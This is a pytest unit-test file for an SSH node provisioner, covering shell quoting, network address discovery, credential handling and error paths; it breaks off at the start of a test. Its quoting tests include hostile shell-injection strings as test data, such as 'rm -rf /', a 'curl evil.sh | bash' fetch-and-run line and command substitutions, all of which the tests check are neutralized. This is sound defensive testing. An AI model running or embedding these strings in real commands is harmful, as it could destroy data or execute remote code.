"""Unit tests for the SSH node provisioner.

SUT: packages/server/src/nexus_server/services/provisioner.py

Everything external is faked: ``paramiko`` (SSH + SFTP), ``socket`` (UDP
default-route probe + ``gethostname``) and ``subprocess`` (``ifconfig`` /
``ip -4 addr``). No test opens a socket, spawns a process or SSHes anywhere —
the fakes below are installed by monkeypatching the module-level ``paramiko`` /
``socket`` / ``subprocess`` names inside the provisioner module, so a regression
that reaches for the real thing shows up as an AttributeError rather than as a
hung test.

What is covered:
  * ``_q`` — the single shell-quoting barrier between operator input and remote
    ``bash``; verified by round-tripping through ``shlex.split``.
  * ``local_ipv4s`` / ``server_hostname`` / ``callback_candidates`` — callback
    address discovery, including every degradation path.
  * ``_first_path`` — remote executable probing.
  * ``provision`` — the whole SSH sequence: auth modes, credential hygiene, the
    git/Python/Homebrew preflight, install-script upload + argv, WS_HOST
    parsing, log assembly, every ``{"ok": False, "error": ...}`` branch, and
    session cleanup.
  * ``RESOLVE_PY`` / ``INSTALL_SH`` — static pins on the local<->remote contract
    (exit codes and the machine-readable ``WS_HOST`` line) that ``provision``
    parses. These literals run only on real devices, so the exit-code mapping is
    otherwise untested.
"""

from __future__ import annotations

import io
import shlex
import types
import uuid

import paramiko
import pytest

from nexus_server.services import provisioner
from nexus_server.services.provisioner import (
    GITHUB_URL_DEFAULT,
    INSTALL_SH,
    RESOLVE_PY,
    _first_path,
    _q,
    callback_candidates,
    local_ipv4s,
    provision,
    server_hostname,
)


# ── Fakes: paramiko ──────────────────────────────────────────────────────────


class _FakeChannel:
    """Stand-in for ``paramiko.Channel``; only ``recv_exit_status`` is used."""

    def __init__(self, rc: int) -> None:
        self.rc = rc

    def recv_exit_status(self) -> int:
        """Return the scripted exit status (blocking in the real client)."""
        return self.rc


class _FakeChannelFile:
    """Stand-in for the file-like objects ``exec_command`` returns.

    ``provision.run`` reads ``o.channel.recv_exit_status()`` then ``o.read()``
    on both streams and decodes as UTF-8, so a payload may be supplied as bytes
    to exercise the decode-failure path.
    """

    def __init__(self, data: str | bytes, rc: int) -> None:
        self._data = data.encode() if isinstance(data, str) else data
        self.channel = _FakeChannel(rc)

    def read(self) -> bytes:
        """Return the whole scripted payload as bytes."""
        return self._data


class _FakeSFTP:
    """Records ``putfo`` uploads instead of writing to a remote filesystem."""

    def __init__(self) -> None:
        self.uploads: list[tuple[str, bytes]] = []
        self.closed = 0

    def putfo(self, fileobj: io.BytesIO, path: str) -> None:
        """Capture (remote path, uploaded bytes)."""
        self.uploads.append((path, fileobj.read()))

    def close(self) -> None:
        """Count close calls so tests can assert the handle is not leaked."""
        self.closed += 1


class _FakeSSHClient:
    """Programmable ``paramiko.SSHClient`` replacement.

    Args:
        handler: ``callable(cmd) -> (rc, stdout, stderr)`` — the fake remote
            shell (see :func:`_remote`).
        connect_error: Exception instance raised by ``connect``.
        sftp_error: Exception instance raised by ``open_sftp``.
        exec_error: Exception instance raised by ``exec_command``.
    """

    def __init__(self, handler, *, connect_error=None, sftp_error=None, exec_error=None):
        self._handler = handler
        self._connect_error = connect_error
        self._sftp_error = sftp_error
        self._exec_error = exec_error
        self.policy = None
        self.connect_calls: list[tuple[tuple, dict]] = []
        self.commands: list[tuple[str, int | None]] = []
        self.sftp = _FakeSFTP()
        self.sftp_calls = 0
        self.closed = 0

    def set_missing_host_key_policy(self, policy) -> None:
        """Record the host-key policy provision installs."""
        self.policy = policy

    def connect(self, *args, **kwargs) -> None:
        """Record connect args; raise ``connect_error`` when configured."""
        self.connect_calls.append((args, kwargs))
        if self._connect_error is not None:
            raise self._connect_error

    def exec_command(self, cmd, timeout=None):
        """Return scripted ``(stdin, stdout, stderr)`` for ``cmd``."""
        self.commands.append((cmd, timeout))
        if self._exec_error is not None:
            raise self._exec_error
        rc, out, err = self._handler(cmd)
        return None, _FakeChannelFile(out, rc), _FakeChannelFile(err, rc)

    def open_sftp(self) -> _FakeSFTP:
        """Return the recording SFTP handle; raise ``sftp_error`` if set."""
        self.sftp_calls += 1
        if self._sftp_error is not None:
            raise self._sftp_error
        return self.sftp

    def close(self) -> None:
        """Count close calls (the ``finally`` in provision must reach this)."""
        self.closed += 1

    # ── convenience accessors used by assertions ──

    @property
    def cmds(self) -> list[str]:
        """Just the command strings, in execution order."""
        return [c for c, _ in self.commands]

    def find_cmd(self, needle: str) -> tuple[str, int | None]:
        """Return the first recorded ``(cmd, timeout)`` containing ``needle``."""
        for entry in self.commands:
            if needle in entry[0]:
                return entry
        raise AssertionError(f"no recorded command containing {needle!r}: {self.cmds}")


def _remote(
    *,
    git=(0, "", ""),
    resolve=(0, "/usr/bin/python3.12\n", ""),
    install=(0, "WS_HOST 10.0.0.5\nAGENT_RUNNING 4242\n", ""),
    brew_probe=(1, "", ""),
    brew_install=(0, "", ""),
    default=(0, "", ""),
):
    """Build a fake remote shell for :class:`_FakeSSHClient`.

    Each response may be a 2/3-tuple, a ``callable(cmd)`` returning one, or a
    list of them (popped per call, the last entry repeating) for commands
    provision runs twice — e.g. the Python re-resolve after a Homebrew install.

    The default script is the fully-happy device: git present, Python 3.12
    found, installer exits 0 announcing ``WS_HOST 10.0.0.5``.
    """
    rules = [
        ("command -v git", git),
        ("/tmp/nexus-install.sh", install),
        ("bash -c", resolve),
        ("install python@3.12", brew_install),
        ("command -v", brew_probe),
    ]

    def handler(cmd):
        for needle, resp in rules:
            if needle in cmd:
                return _normalize(resp, cmd)
        return _normalize(default, cmd)

    return handler


def _normalize(resp, cmd):
    """Resolve a scripted response into a ``(rc, stdout, stderr)`` triple."""
    if callable(resp):
        resp = resp(cmd)
    if isinstance(resp, list):
        # Pop until one entry is left, which then repeats for later calls.
        resp = resp.pop(0) if len(resp) > 1 else resp[0]
    if len(resp) == 2:
        return resp[0], resp[1], ""
    return resp


# ── Fakes: socket / subprocess ───────────────────────────────────────────────


class _FakeSocket:
    """UDP socket stand-in for the default-route source-address probe."""

    def __init__(self, sockname="192.168.1.50", connect_error=None):
        self._sockname = sockname
        self._connect_error = connect_error
        self.connected: list[tuple] = []
        self.closed = False

    def connect(self, addr) -> None:
        """Record the peer address; raise ``connect_error`` when configured."""
        self.connected.append(addr)
        if self._connect_error is not None:
            raise self._connect_error

    def getsockname(self):
        """Return the kernel-selected local ``(addr, port)``."""
        return (self._sockname, 51234)

    def close(self) -> None:
        """Mark the socket closed so fd-leak assertions are possible."""
        self.closed = True


class _FakeSocketModule:
    """Replacement for the ``socket`` module as the provisioner uses it."""

    AF_INET = "AF_INET"
    SOCK_DGRAM = "SOCK_DGRAM"

    def __init__(self, sock=None, *, socket_error=None, hostname="srv", hostname_error=None):
        self.sock = sock
        self._socket_error = socket_error
        self._hostname = hostname
        self._hostname_error = hostname_error
        self.socket_calls: list[tuple] = []

    def socket(self, family, kind):
        """Return the pre-built fake socket, recording the address family."""
        self.socket_calls.append((family, kind))
        if self._socket_error is not None:
            raise self._socket_error
        return self.sock

    def gethostname(self) -> str:
        """Return the configured hostname or raise the configured error."""
        if self._hostname_error is not None:
            raise self._hostname_error
        return self._hostname


class _FakeSubprocess:
    """Replacement for ``subprocess`` exposing only ``run``.

    Args:
        outputs: Maps argv[0] -> stdout string, or to an Exception instance
            which is raised instead (e.g. ``FileNotFoundError`` for a missing
            ``ifconfig``).
    """

    def __init__(self, outputs: dict[str, object]):
        self.outputs = outputs
        self.calls: list[tuple[list[str], dict]] = []

    def run(self, argv, **kwargs):
        """Record the invocation and return a ``CompletedProcess``-alike."""
        self.calls.append((list(argv), kwargs))
        out = self.outputs.get(argv[0], "")
        if isinstance(out, Exception):
            raise out
        return types.SimpleNamespace(stdout=out, stderr="", returncode=0)


# ── Fixtures ─────────────────────────────────────────────────────────────────


_NODE_ID = "11111111-1111-1111-1111-111111111111"

_PROVISION_DEFAULTS = dict(
    host="dev.local",
    user="ops",
    password="sshpw",
    use_server_key=False,
    node_id=_NODE_ID,
    api_key="node-api-key",
    server_ips=["srv.local", "10.0.0.5"],
)


@pytest.fixture
def run_provision(monkeypatch):
    """Factory that calls ``provision`` against a fake paramiko.

    Installs a fake ``paramiko`` namespace (real ``AutoAddPolicy`` class, so the
    host-key assertion is meaningful) on the provisioner module and returns
    ``_run(handler=None, client_kwargs=None, **provision_overrides)`` ->
    ``(result_dict, fake_client)``.
    """

    def _run(handler=None, client_kwargs=None, **overrides):
        client = _FakeSSHClient(handler or _remote(), **(client_kwargs or {}))
        monkeypatch.setattr(
            provisioner,
            "paramiko",
            types.SimpleNamespace(
                SSHClient=lambda: client, AutoAddPolicy=paramiko.AutoAddPolicy
            ),
        )
        kwargs = {**_PROVISION_DEFAULTS, **overrides}
        return provision(**kwargs), client

    return _run


@pytest.fixture
def patch_net(monkeypatch):
    """Factory installing fake ``socket`` / ``subprocess`` modules.

    ``_patch(sock=..., hostname=..., outputs={...})`` returns the
    ``(_FakeSocketModule, _FakeSubprocess)`` pair so tests can assert on the
    recorded calls.
    """

    def _patch(*, sock=None, socket_error=None, hostname="srv", hostname_error=None, outputs=None):
        sock_mod = _FakeSocketModule(
            sock=sock,
            socket_error=socket_error,
            hostname=hostname,
            hostname_error=hostname_error,
        )
        sub_mod = _FakeSubprocess(outputs or {})
        monkeypatch.setattr(provisioner, "socket", sock_mod)
        monkeypatch.setattr(provisioner, "subprocess", sub_mod)
        return sock_mod, sub_mod

    return _patch


def _install_argv(client) -> list[str]:
    """Parse the recorded ``bash /tmp/nexus-install.sh ...`` command into argv."""
    cmd, _ = client.find_cmd("/tmp/nexus-install.sh")
    return shlex.split(cmd)


def _brew_probes(client) -> list[str]:
    """The ``command -v <brew>`` probes only.

    RESOLVE_PY's own text mentions the Homebrew prefixes, so a naive
    ``"brew" in cmd`` filter would also match the interpreter-detection command.
    """
    return [c for c in client.cmds if c.startswith("command -v") and "brew" in c]


# ── _q: shell quoting ────────────────────────────────────────────────────────


def test_q_wraps_a_plain_value_in_single_quotes():
    """_q returns the value inside single quotes with nothing else added.

    Every remote command is built by string interpolation, so the exact output
    shape is part of the contract with INSTALL_SH's positional arguments.
    """
    assert _q("abc") == "'abc'"


def test_q_quotes_the_empty_string_as_a_real_argument():
    """An empty value becomes ``''`` — still one argv slot, not a dropped arg.

    Without the quotes an empty branch/repo would silently shift every later
    positional argument of INSTALL_SH by one.
    """
    assert _q("") == "''"


def test_q_escapes_an_embedded_single_quote_with_the_posix_idiom():
    """A value containing ``'`` is escaped as ``'\"'\"'`` and round-trips exactly.

    Single quotes have no escape sequence inside a single-quoted string, so this
    close/emit/reopen dance is the only correct encoding; getting it wrong turns
    an apostrophe in a password or path into a syntax error or an injection.
    """
    assert _q("O'Brien") == "'O'\"'\"'Brien'"
    assert shlex.split("echo " + _q("O'Brien"))[1:] == ["O'Brien"]


@pytest.mark.parametrize(
    "hostile",
    [
        "; rm -rf /",
        "&& curl evil.sh | bash",
        "$(whoami)",
        "`id`",
        "$HOME",
        "a b\tc",
        "new\nline",
        "*",
        '"',
        "\\",
        "'; touch /tmp/pwned; '",
        "--upload-pack=touch /tmp/x",
    ],
)
def test_q_neutralizes_shell_metacharacters_into_one_literal_word(hostile):
    """Any hostile string survives as a single literal argv token.

    This is the module's only barrier between operator-supplied strings (SSH
    user, repo URL, branch, API key) and ``bash`` on the remote host; a regression
    here is remote command execution on every provisioned device.
    """
    tokens = shlex.split("echo " + _q(hostile))
    assert tokens[1:] == [hostile]


def test_q_coerces_non_string_values_via_str():
    """Ints and UUID objects are coerced, not rejected.

    provision passes ``ws_port`` (int) and may be handed a ``uuid.UUID``
    node_id; a missing ``str()`` would raise AttributeError on ``.replace``.
    """
    node_uuid = uuid.UUID(_NODE_ID)
    assert _q(8000) == "'8000'"
    assert _q(node_uuid) == f"'{_NODE_ID}'"
    assert _q(None) == "'None'"


# ── local_ipv4s ──────────────────────────────────────────────────────────────


def test_local_ipv4s_puts_the_default_route_address_first(patch_net):
    """The UDP-probe address leads, then ifconfig addresses in interface order.

    Order is load-bearing: the remote installer keeps the FIRST candidate that
    completes a WebSocket handshake, so the default-route address must be tried
    before secondary interfaces.
    """
    sock = _FakeSocket(sockname="192.168.1.50")
    patch_net(sock=sock, outputs={"ifconfig": "inet 10.0.0.7\ninet 172.16.3.9\n"})

    assert local_ipv4s() == ["192.168.1.50", "10.0.0.7", "172.16.3.9"]


def test_local_ipv4s_probes_udp_without_sending_traffic_and_closes_the_socket(patch_net):
    """The probe is a datagram connect to 8.8.8.8:80, and the socket is closed.

    A SOCK_STREAM regression would actually dial Google and hang/raise on an
    offline host; leaving the socket open would leak an fd per call.
    """
    sock = _FakeSocket(sockname="192.168.1.50")
    sock_mod, _ = patch_net(sock=sock, outputs={"ifconfig": ""})

    local_ipv4s()

    assert sock_mod.socket_calls == [("AF_INET", "SOCK_DGRAM")]
    assert sock.connected == [("8.8.8.8", 80)]
    assert sock.closed is True


def test_local_ipv4s_filters_loopback_and_link_local(patch_net):
    """127.* and 169.254.* are dropped — a remote agent can never reach them.

    Handing an agent 127.0.0.1 as its callback address produces a node that
    installs cleanly and then never connects.
    """
    sock = _FakeSocket(sockname="127.0.0.1")
    patch_net(
        sock=sock,
        outputs={"ifconfig": "inet 127.0.0.1\ninet 169.254.13.2\ninet 10.1.2.3\n"},
    )

    assert local_ipv4s() == ["10.1.2.3"]


def test_local_ipv4s_deduplicates_addresses_seen_twice(patch_net):
    """An address reported by both the UDP probe and ifconfig appears once."""
    sock = _FakeSocket(sockname="10.0.0.7")
    patch_net(sock=sock, outputs={"ifconfig": "inet 10.0.0.7\ninet 10.0.0.8\n"})

    assert local_ipv4s() == ["10.0.0.7", "10.0.0.8"]


def test_local_ipv4s_parses_the_legacy_inet_addr_form(patch_net):
    """``inet addr:10.0.0.9`` (old Linux ifconfig) is parsed as well as ``inet``.

    The optional ``addr:`` group in the regex is what makes provisioning work
    from an older-net-tools host.
    """
    sock = _FakeSocket(sockname="192.168.0.2")
    patch_net(sock=sock, outputs={"ifconfig": "inet addr:10.0.0.9  Bcast:10.0.0.255\n"})

    assert local_ipv4s() == ["192.168.0.2", "10.0.0.9"]


def test_local_ipv4s_falls_back_to_ip_addr_when_ifconfig_prints_nothing(patch_net):
    """Empty ifconfig stdout triggers ``ip -4 addr``, whose output is parsed.

    Minimal container images ship ``ip`` but not ``ifconfig`` (and the latter can
    exit 0 with no output), so without this fallback there are no IP candidates.
    """
    sock = _FakeSocket(sockname="192.168.1.50")
    _, sub = patch_net(
        sock=sock,
        outputs={"ifconfig": "", "ip": "    inet 10.2.0.4/24 brd 10.2.0.255 scope global\n"},
    )

    assert local_ipv4s() == ["192.168.1.50", "10.2.0.4"]
    assert [call[0] for call in sub.calls] == [["ifconfig"], ["ip", "-4", "addr"]]


def test_local_ipv4s_bounds_each_subprocess_with_a_five_second_timeout(patch_net):
    """Both discovery commands are captured, text-decoded and timeout-bounded.

    provision runs inside ``asyncio.to_thread``; an unbounded ifconfig would pin
    that worker thread for the life of the process.
    """
    sock = _FakeSocket(sockname="192.168.1.50")
    _, sub = patch_net(sock=sock, outputs={"ifconfig": "", "ip": ""})

    local_ipv4s()

    for _argv, kwargs in sub.calls:
        assert kwargs["timeout"] == 5
        assert kwargs["capture_output"] is True
        assert kwargs["text"] is True


def test_local_ipv4s_survives_a_failing_udp_probe(patch_net):
    """An offline host (connect raises) still yields the ifconfig addresses.

    The two discovery passes are independently guarded; a raise here used to be
    the difference between "no candidates" and a working provision on a machine
    with no default route.
    """
    sock = _FakeSocket(sockname="192.168.1.50", connect_error=OSError("network unreachable"))
    patch_net(sock=sock, outputs={"ifconfig": "inet 10.0.0.7\n"})

    assert local_ipv4s() == ["10.0.0.7"]


def test_local_ipv4s_survives_a_missing_ifconfig_binary(patch_net):
    """FileNotFoundError from the subprocess pass leaves the UDP result intact."""
    sock = _FakeSocket(sockname="192.168.1.50")
    patch_net(sock=sock, outputs={"ifconfig": FileNotFoundError("ifconfig")})

    assert local_ipv4s() == ["192.168.1.50"]


def test_local_ipv4s_returns_empty_when_both_discovery_passes_fail(patch_net):
    """Total failure degrades to ``[]`` rather than raising.

    provision then falls back to ``["localhost"]``; an exception here would turn
    a degraded network into an HTTP 500 on the register-node endpoint.
    """
    patch_net(
        sock=None,
        socket_error=OSError("socket() failed"),
        outputs={"ifconfig": OSError("boom")},
    )

    assert local_ipv4s() == []


# ── server_hostname ──────────────────────────────────────────────────────────


def test_server_hostname_appends_dot_local_to_a_bare_name(patch_net):
    """A bare macOS hostname becomes the mDNS-resolvable ``.local`` form.

    ``gethostname()`` on macOS returns ``foo``, which no other machine can
    resolve; ``foo.local`` is what mDNS answers for.
    """
    patch_net(hostname="mac-mini")

    assert server_hostname() == "mac-mini.local"


def test_server_hostname_leaves_a_qualified_name_untouched(patch_net):
    """A name that already contains a dot is returned verbatim (no double suffix)."""
    patch_net(hostname="build01.lab.example.com")

    assert server_hostname() == "build01.lab.example.com"


@pytest.mark.parametrize("name", ["localhost", "localhost.local"])
def test_server_hostname_rejects_loopback_names(patch_net, name):
    """Loopback names return None — an agent could never resolve them back here.

    Emitting "localhost" as the first callback candidate would burn the
    installer's handshake timeout on an address that can only ever work when the
    device *is* the server.
    """
    patch_net(hostname=name)

    assert server_hostname() is None


def test_server_hostname_rejects_an_empty_hostname(patch_net):
    """An empty ``gethostname()`` result yields None instead of ``".local"``."""
    patch_net(hostname="")

    assert server_hostname() is None


def test_server_hostname_accepts_localhost_localdomain(patch_net):
    """``localhost.localdomain`` is NOT filtered — only the two exact names are.

    Documents current behaviour: the guard is an exact-match tuple, so this
    common Linux default is returned as a candidate and costs one handshake
    timeout on the device.
    """
    patch_net(hostname="localhost.localdomain")

    assert server_hostname() == "localhost.localdomain"


def test_server_hostname_returns_none_when_gethostname_raises(patch_net):
    """A raising ``gethostname()`` degrades to None rather than propagating."""
    patch_net(hostname_error=OSError("no hostname"))

    assert server_hostname() is None


# ── callback_candidates ──────────────────────────────────────────────────────


def test_callback_candidates_orders_hostname_before_ip_addresses(patch_net):
    """The mDNS hostname leads, then IPv4s default-route-first.

    Leading with the hostname is what lets a node keep reconnecting across a
    DHCP lease change; if the IPs came first the installer would pin one.
    """
    sock = _FakeSocket(sockname="192.168.1.50")
    patch_net(sock=sock, hostname="srv", outputs={"ifconfig": "inet 10.0.0.7\n"})

    assert callback_candidates() == ["srv.local", "192.168.1.50", "10.0.0.7"]


def test_callback_candidates_omits_an_unusable_hostname(patch_net):
    """When server_hostname() is None the list is IPs only."""
    sock = _FakeSocket(sockname="192.168.1.50")
    patch_net(sock=sock, hostname="localhost", outputs={"ifconfig": ""})

    assert callback_candidates() == ["192.168.1.50"]


def test_callback_candidates_deduplicates_a_hostname_that_is_also_an_ip(patch_net):
    """A numeric hostname equal to a discovered IP is not duplicated.

    Duplicate candidates double the installer's worst-case handshake wait.
    """
    sock = _FakeSocket(sockname="10.0.0.7")
    patch_net(sock=sock, hostname="10.0.0.7", outputs={"ifconfig": "inet 10.0.0.7\n"})

    assert callback_candidates() == ["10.0.0.7"]


def test_callback_candidates_can_be_empty_on_an_isolated_host(patch_net):
    """No hostname and no usable IP yields ``[]`` (provision then uses localhost)."""
    sock = _FakeSocket(sockname="127.0.0.1")
    patch_net(sock=sock, hostname="localhost", outputs={"ifconfig": "inet 127.0.0.1\n"})

    assert callback_candidates() == []


# ── _first_path ──────────────────────────────────────────────────────────────


def test_first_path_returns_the_first_hit_and_stops_probing():
    """Probing short-circuits on the first ``command -v`` that exits 0.

    Each probe is a full SSH round trip, so continuing after a hit would add
    avoidable latency to every Homebrew fallback.
    """
    seen: list[str] = []

    def run(cmd, timeout=600):
        seen.append(cmd)
        return (0 if "usr/local" in cmd else 1), "", ""

    assert _first_path(run, ["/opt/homebrew/bin/brew", "/usr/local/bin/brew", "brew"]) == (
        "/usr/local/bin/brew"
    )
    assert len(seen) == 2


def test_first_path_shell_quotes_each_candidate():
    """Candidates are passed through _q, so a path with a space stays one word."""
    seen: list[str] = []

    def run(cmd, timeout=600):
        seen.append(cmd)
        return 1, "", ""

    _first_path(run, ["/opt/my tools/brew"])

    assert seen == ["command -v '/opt/my tools/brew'"]


def test_first_path_returns_none_after_exhausting_candidates():
    """All-miss probing returns None having tried every candidate in order."""
    seen: list[str] = []

    def run(cmd, timeout=600):
        seen.append(cmd)
        return 127, "", ""

    assert _first_path(run, ["a", "b", "c"]) is None
    assert seen == ["command -v 'a'", "command -v 'b'", "command -v 'c'"]


def test_first_path_with_no_candidates_never_touches_the_session():
    """An empty candidate list returns None without issuing a command."""
    calls: list[str] = []

    def run(cmd, timeout=600):
        calls.append(cmd)
        return 0, "", ""

    assert _first_path(run, []) is None
    assert calls == []


# ── provision: happy path ────────────────────────────────────────────────────


def test_provision_happy_path_returns_ws_url_host_and_mode(run_provision):
    """A clean run reports ok with the installer-chosen callback address.

    ``ws_url`` is what the dashboard shows and what the device was configured
    with, so the host must come from the installer's WS_HOST line (not from the
    first candidate) — that is the whole point of the handshake probe.
    """
    result, _client = run_provision()

    assert result["ok"] is True
    assert result["ws_host"] == "10.0.0.5"
    assert result["ws_url"] == f"ws://10.0.0.5:8000/ws/agent/{_NODE_ID}"
    assert result["mode"] == "background"
    assert "error" not in result


def test_provision_log_records_connect_selection_python_and_remote_output(run_provision):
    """The dashboard log reads: Connected -> selected address -> python -> output.

    The chosen address is inserted at index 1 specifically so it appears as the
    first real step; the machine-readable WS_HOST line itself must never leak
    into the operator log.
    """
    result, _client = run_provision()

    assert result["log"] == [
        "Connected.",
        "Selected callback address 10.0.0.5 (WebSocket handshake OK).",
        "Remote Python: /usr/bin/python3.12",
        "AGENT_RUNNING 4242",
    ]
    assert not any("WS_HOST" in line for line in result["log"])


def test_provision_uploads_the_install_script_verbatim_and_closes_sftp(run_provision):
    """INSTALL_SH is SFTP'd to /tmp/nexus-install.sh byte-for-byte, handle closed.

    The installer is executed with plain ``bash`` from that fixed path, so a
    changed path or a mangled upload breaks every provision.
    """
    _result, client = run_provision()

    assert client.sftp.uploads == [("/tmp/nexus-install.sh", INSTALL_SH.encode())]
    assert client.sftp.closed == 1


def test_provision_install_argv_matches_the_scripts_positional_contract(run_provision):
    """The nine install arguments are passed in the documented order.

    INSTALL_SH reads $1..$9 positionally (PY RD REPO_URL BRANCH CANDS PORT KEY
    NID MODE); any reordering silently installs the wrong thing — e.g. the API
    key as a branch name.
    """
    _result, client = run_provision(
        repo_url="https://example.invalid/fork.git", branch="release", ws_port=9443
    )

    assert _install_argv(client) == [
        "bash",
        "/tmp/nexus-install.sh",
        "/usr/bin/python3.12",
        "nexus",
        "https://example.invalid/fork.git",
        "release",
        "srv.local,10.0.0.5",
        "9443",
        "node-api-key",
        _NODE_ID,
        "background",
    ]


def test_provision_defaults_to_the_public_agent_repo_and_main_branch(run_provision):
    """Omitting repo_url/branch installs GITHUB_URL_DEFAULT @ main."""
    _result, client = run_provision()
    argv = _install_argv(client)

    assert argv[4] == GITHUB_URL_DEFAULT
    assert argv[5] == "main"


def test_provision_service_mode_requests_an_autostart_install(run_provision):
    """service=True passes mode 'service' and echoes it back in the result.

    The mode selects launchd/systemd on the device; reporting the wrong value
    would tell the operator the agent survives reboot when it does not.
    """
    result, client = run_provision(service=True)

    assert _install_argv(client)[-1] == "service"
    assert result["mode"] == "service"


def test_provision_joins_multiple_callback_candidates_with_commas(run_provision):
    """server_ips is flattened to the comma list INSTALL_SH splits on."""
    _result, client = run_provision(server_ips=["a.local", "10.0.0.1", "10.0.0.2"])

    assert _install_argv(client)[6] == "a.local,10.0.0.1,10.0.0.2"


def test_provision_falls_back_to_localhost_when_no_candidates_are_given(run_provision):
    """An empty server_ips degrades to the single candidate 'localhost'.

    Only correct when the device is the server itself, but it keeps provisioning
    from crashing on ``candidates[0]`` with an empty list.
    """
    _result, client = run_provision(server_ips=[])

    assert _install_argv(client)[6] == "localhost"


def test_provision_uses_the_documented_per_command_timeouts(run_provision):
    """Preflight probes get 600s, the installer 1200s, brew 1800s.

    A cold ``brew install python@3.12`` builds from source and routinely exceeds
    the 600s default; the installer's git clone + venv + pip needs more than a
    probe but must still be bounded.
    """
    resolve_pair = [(1, "", ""), (0, "/usr/bin/python3.12\n", "")]
    _result, client = run_provision(
        handler=_remote(resolve=resolve_pair, brew_probe=(0, "", ""))
    )

    assert client.find_cmd("command -v git")[1] == 600
    assert client.find_cmd("bash -c")[1] == 600
    assert client.find_cmd("install python@3.12")[1] == 1800
    assert client.find_cmd("/tmp/nexus-install.sh")[1] == 1200


def test_provision_closes_the_ssh_session_on_success(run_provision):
    """The finally-block closes the client exactly once on the success path.

    Provisioning is retried by operators; a leaked transport per attempt
    exhausts fds on the server, not on the device.
    """
    _result, client = run_provision()

    assert client.closed == 1


# ── provision: authentication + credential handling ──────────────────────────


def test_provision_password_auth_disables_key_and_agent_lookup(run_provision):
    """Password auth passes look_for_keys/allow_agent False with a 20s timeout.

    A stray key on the server must not silently authenticate when the operator
    asked for password auth — a wrong password has to fail loudly.
    """
    _result, client = run_provision(password="sshpw")

    (args, kwargs) = client.connect_calls[0]
    assert args == ("dev.local",)
    assert kwargs["username"] == "ops"
    assert kwargs["password"] == "sshpw"
    assert kwargs["look_for_keys"] is False
    assert kwargs["allow_agent"] is False
    assert kwargs["timeout"] == 20


def test_provision_server_key_auth_never_forwards_a_password(run_provision):
    """use_server_key=True omits the password kwarg entirely, even if one is set.

    Regression guard on credential leakage: the operator asked for key auth, so
    a stored SSH password must not be presented to the device.
    """
    _result, client = run_provision(use_server_key=True, password="should-be-ignored")

    (args, kwargs) = client.connect_calls[0]
    assert args == ("dev.local",)
    assert set(kwargs) == {"username", "timeout"}
    assert "should-be-ignored" not in repr(client.connect_calls[0][1])
    assert not any("should-be-ignored" in cmd for cmd in client.cmds)


def test_provision_accepts_a_none_password_for_key_based_auth(run_provision):
    """password=None with use_server_key=False is forwarded as None, not "".

    paramiko treats None as "no password supplied" and can still use an agent
    key; coercing it to an empty string would change the auth attempt.
    """
    result, client = run_provision(password=None)

    assert result["ok"] is True
    assert client.connect_calls[0][1]["password"] is None


def test_provision_never_leaks_the_ssh_password_into_logs_or_remote_commands(run_provision):
    """The SSH password appears in no log line, command, upload, or result.

    The dashboard renders ``log`` verbatim and the result is serialised into an
    HTTP response, so any echo of the password would publish it.
    """
    secret = "sup3r-s3cret-ssh-pw"
    result, client = run_provision(password=secret)

    assert secret not in repr(result)
    assert not any(secret in line for line in result["log"])
    assert not any(secret in cmd for cmd in client.cmds)
    assert not any(secret in payload.decode() for _path, payload in client.sftp.uploads)


def test_provision_shell_quotes_a_hostile_api_key_into_the_install_command(run_provision):
    """The node API key is quoted, so quotes/semicolons in it cannot inject.

    The key must reach the device intact (the agent presents it on every WS
    connect) *and* must not break out of the install command.
    """
    nasty = "key'; touch /tmp/pwned; echo '"
    _result, client = run_provision(api_key=nasty)

    assert _install_argv(client)[8] == nasty


def test_provision_shell_quotes_hostile_repo_url_and_branch(run_provision):
    """Operator-supplied repo/branch survive as literal argv entries.

    These come straight from the JSON request body, so they are the most likely
    injection vector into the remote shell.
    """
    _result, client = run_provision(
        repo_url="https://x.invalid/r.git; rm -rf ~", branch="main$(id)"
    )
    argv = _install_argv(client)

    assert argv[4] == "https://x.invalid/r.git; rm -rf ~"
    assert argv[5] == "main$(id)"


def test_provision_accepts_a_raw_uuid_node_id(run_provision):
    """A ``uuid.UUID`` node_id is stringified for both the argv and the ws_url.

    The route passes a str today, but every id in this codebase is a
    ``String(36)`` column and raw ``uuid.UUID`` objects are a known crash class
    elsewhere; here the coercion happens in _q and the f-string, so a UUID must
    not produce ``UUID('...')`` in the WebSocket path.
    """
    node_uuid = uuid.UUID(_NODE_ID)
    result, client = run_provision(node_id=node_uuid)

    assert _install_argv(client)[9] == _NODE_ID
    assert result["ws_url"] == f"ws://10.0.0.5:8000/ws/agent/{_NODE_ID}"
    assert "UUID(" not in result["ws_url"]


def test_provision_installs_the_auto_add_host_key_policy(run_provision):
    """Unknown host keys are auto-accepted (documented TOFU trade-off).

    Deliberate for reimaged lab devices; pinned here so a change to MITM
    posture is a conscious edit rather than a silent one.
    """
    _result, client = run_provision()

    assert isinstance(client.policy, paramiko.AutoAddPolicy)


# ── provision: connection + preflight failures ───────────────────────────────


def test_provision_returns_structured_error_when_ssh_connect_fails(run_provision):
    """A refused/unauthenticated connect yields ok=False with the exception type.

    Callers surface ``error`` to the operator; raising instead would turn a bad
    password into an opaque HTTP 500.
    """
    result, client = run_provision(
        client_kwargs={"connect_error": paramiko.AuthenticationException("bad creds")}
    )

    assert result["ok"] is False
    assert result["error"].startswith("SSH connection failed: AuthenticationException:")
    assert "bad creds" in result["error"]
    assert result["log"] == []
    assert client.commands == []


def test_provision_connect_failure_skips_the_close_call(run_provision):
    """The connect-failure return is outside the try/finally, so close() is skipped.

    Documents current behaviour and its rationale: the transport never came up,
    so there is nothing to release.
    """
    result, client = run_provision(client_kwargs={"connect_error": OSError("no route")})

    assert result["ok"] is False
    assert client.closed == 0


def test_provision_fails_fast_when_git_is_missing(run_provision):
    """A device without git errors out before anything is uploaded or installed.

    The installer's very first act is a clone, so continuing would waste a
    1200s timeout to reach the same conclusion.
    """
    result, client = run_provision(handler=_remote(git=(1, "", "")))

    assert result["ok"] is False
    assert result["error"] == "git not found on the remote device."
    assert result["log"] == ["Connected."]
    assert client.sftp_calls == 0
    assert not any("/tmp/nexus-install.sh" in cmd for cmd in client.cmds)


def test_provision_closes_the_ssh_session_on_a_preflight_failure(run_provision):
    """The finally-block still runs when an early branch returns ok=False.

    This is the only thing preventing leaked SSH sessions across repeated failed
    provisioning attempts.
    """
    _result, client = run_provision(handler=_remote(git=(1, "", "")))

    assert client.closed == 1


# ── provision: remote Python resolution ──────────────────────────────────────


def test_provision_pinned_remote_python_skips_detection_entirely(run_provision):
